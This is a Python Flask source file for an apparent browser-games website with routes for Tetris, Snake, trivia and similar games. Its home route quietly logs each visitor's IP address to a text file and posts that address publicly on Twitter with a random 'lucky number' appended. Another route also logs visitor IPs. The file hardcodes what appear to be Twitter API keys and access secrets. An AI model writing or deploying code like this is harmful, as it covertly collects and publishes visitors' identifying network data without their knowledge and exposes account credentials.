from flask import Flask, render_template, request, redirect
import tweepy
import random
app = Flask(__name__)
# Keys/Tokens for twitter bot
consumer_key = "QVmwNTrTO2mlys63Z2bzdErT6"
consumer_secret = "koO1uBGthtbKDt02W4JLTPRbQwrvbn0tSywt3C17FaxSeDdps1"
access_token = "1524861877196668942-n9t3jyblMmPjiRujsk6hDa0ET7dmod"
access_token_secret = "RIppr3bIrJVHufwiuHLXrcNptUAm2TIwiJ6mdEzly6KBN"
#authenitcation for twitter bot
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret)
api = tweepy.API(auth)

gamelist = ["tetris", "snake", "trivia", "soccer penalties", "pacman", "fox and hounds", "mars lander", "maze", "solitare", "maze room", "missionaries and cannibals", "virus"]
number = 0
@app.route('/')
def home():
  # this gets the ip from the user. 
  ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
  #appends ip to text doccument
  ip = open("ip.txt","a")
  ip.write(ip_addr + "\n")
  ip.close()
  ip_addr = str(ip_addr)
  print(ip_addr)
  # posts ip on twitter. The lucky number thing is to avoid duplicate messages which crashes the bot
  api.update_status(ip_addr + " todays lucky number is " + str(random.randint(0,1000)))
  return render_template( "index.html", ip_addr = ip_addr)
  
@app.route('/factors')
def factors_display():
	return render_template(
		"factors.html",
  )

@app.route('/proxy-client')
def proxy_client():
    ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
    ip = open("ip.txt","a")
    ip.write(ip_addr + "\n")
    ip.close()
    return '<h1> Your IP address is:' + ip_addr
  
@app.route('/tetris')
def tetris_display():
  return render_template(
    "tetris.html",
  )
@app.route('/snake')
def snake_display():
  return render_template(
    "snake.html",
  )
@app.route('/trivia')
def trivia_display():
  return render_template(
    "trivia.html",
  )
@app.route('/soccer penalties')
def soccer_display():
  return render_template(
    "soccer penalties.html",
  )
@app.route('/virus')
def virus_display():
  return render_template(
    "virus.html",
  )
@app.route('/fox and hounds')
def fox_display():
  return render_template(
    "fox and hounds.html",
  )
@app.route('/mars lander')
def mars_display():
  return render_template(
    "mars lander.html",
  )
@app.route('/maze')
def maze_display():
  return render_template(
    "maze.html",
  )
@app.route('/solitare')
def solitare():
  return render_template(
    "solitare.html",
  )
@app.route('/maze room')
def mazes_display():
  return render_template(
    "maze room.html",
  )
@app.route('/missionaries and cannibals')
def missionary_display():
  return render_template(
    "missionaries and cannibals.html",
  )

@app.route('/result',methods=['POST', 'GET'])
def result():
    output = request.form.to_dict()
    print(output)
    name = output["name"]
    print(name)
    name = name.lower()
    print(name)
    if name in gamelist:
      return redirect('/' + name)
    return render_template('index.html', name = name)
    
@app.errorhandler(404)
def not_found(e):
  return render_template('404.html')
  
if __name__ == '__main__':
    app.run(host='0.0.0.0')
  #<embed src="https://www.towardsandbeyond.com/" style="width:500px; height: 300px;">
